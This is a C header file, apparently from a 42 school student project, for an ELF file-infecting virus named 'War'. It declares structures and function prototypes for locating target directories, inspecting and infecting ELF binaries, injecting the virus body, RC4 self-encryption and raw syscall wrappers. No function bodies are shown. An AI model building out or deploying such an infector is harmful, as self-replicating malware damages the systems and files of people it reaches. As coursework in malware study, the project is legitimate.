/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   war.h                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/03 19:39:31 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef WAR_H
# define WAR_H

/* Includes */
# include <elf.h>
# include <stdio.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>
# include <unistd.h>
# include <stdbool.h>
# include <sys/mman.h>
# include <stdlib.h>
# include <limits.h>

/* Enum */

/* Define */
# define SIGNATURE	0x216948	// 'Hi!'

# define USER_ENTRY	2
# define ROOT_ENTRY	4
# define PROG_ENTRY	3
# define INST_ENTRY 3
# define KEY_SIZE	16

# define BUFF_SIZE	0x1000
# define PROG_INFO	512

# define ENTRY_OFF	2261
# define KEY_OFF	28

# define __INLINE__	__attribute__((always_inline)) inline
# define __PACKED__ __attribute__ ((__packed__))

// debug
# define DEBUG

/* Structures */
typedef struct __PACKED__ linux_dirent64
{
	__ino64_t			d_ino;
	__off64_t			d_off;
	unsigned short int	d_reclen;
	unsigned char		d_type;
	char				d_name[256];
}						linux_dirent64;

typedef struct	s_directory
{
	int			entry;
	char		path[4][16];
}				t_directory;

typedef struct	s_key
{
	size_t		one;
	size_t		two;
	size_t		junk[2];
	void		*rsp;
}				t_key;

typedef struct	s_bin
{
	int			fd;
	int			pad;
	size_t		size;
	void		*map;
}				t_bin;

typedef struct	s_cypher
{
	Elf64_Phdr	*segment;
	Elf64_Shdr	*section;
	size_t		size;
}				t_cypher;

typedef struct	s_virus
{
	Elf64_Phdr	*data;
	Elf64_Phdr	*note;
	size_t		size;
}				t_virus;

typedef struct	s_data
{
	// core
	t_key		key;
	t_bin		bin;
	t_virus		virus;
	t_cypher	cypher;

	// misc
	Elf64_Ehdr	*header;
	Elf64_Addr	bin_entry;
	Elf64_Addr	vrs_entry;
	Elf64_Addr	cpr_entry;

	void		*rsp;
	uint8_t		cpr_key[KEY_SIZE];
	size_t		context;
}				t_data;

/* Core */
void			start(void);
void			opening(t_data *data);
void			war(t_data *data);
void			locate(t_data *data, t_directory *dir);
void			inspect(t_data *data, char *path);
void			infect(t_data *data);
void			inject(t_data *data);
void			release(t_data *data);
void			cypher_end(t_data *data);
void			end(void);

/*
**	Misc
*/
void			update_one(t_key *key, char *ptr, size_t size);
void			update_two(t_key *key, char *ptr, size_t size);
void			revert_one(t_key *key, char *ptr, size_t size);
void			revert_two(t_key *key, char *ptr, size_t size);
bool			generate_key(uint8_t *key, size_t size);

/*
**	Lib
*/
void			_rc4(const unsigned char *key, const size_t key_length, uint8_t *data, const size_t data_length);
void			*_memcpy(void *d, void *s, size_t size);
void			*_memset(void *b, int c, size_t len);
int				_strncmp(char *s1, char *s2, size_t n);
size_t			_strlen(char *s);
bool			check_name(char *str, int len);
void			__exit(int status);
int				_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
int				_open(const char *path, int flags, mode_t mode);
int				_fstat(int fd, struct stat *statbuf);
int				_close(int fd);
void			*_mmap(void *addr, size_t len, int prot, size_t flags, size_t fd, off_t offset);
int				_munmap(void *addr, size_t len);
ssize_t			_read(int fd, void *buf, size_t len);
int				_write(int fd, const void *buf, size_t len);
int				_getuid(void);
int				_random_number(int limit);
ssize_t			_get_random(void *buf, size_t buflen, unsigned int flags);
void			end_of_data(void);

#endif
